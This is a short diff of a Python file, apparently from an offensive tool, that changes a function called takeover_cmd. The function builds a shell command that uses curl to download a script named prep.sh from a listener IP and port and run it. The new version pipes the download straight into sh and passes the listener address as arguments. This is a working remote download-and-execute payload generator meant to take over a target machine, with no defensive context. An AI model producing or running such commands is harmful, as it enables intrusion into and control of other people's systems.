@@ -6,8 +6,8 @@ import sys
 
 srv_run = True
 
-def takeover_cmd(listen_ip: str, listen_port: int) -> str:
-    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
+def takeover_cmd(listen_ip: str, listen_port: int, www: bool=False) -> str:
+    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh | sh -s -- {listen_ip} {listen_port} {1 if www else 0}"
     # cmd_str = f"ping {listen_ip}"
     return cmd_str
 
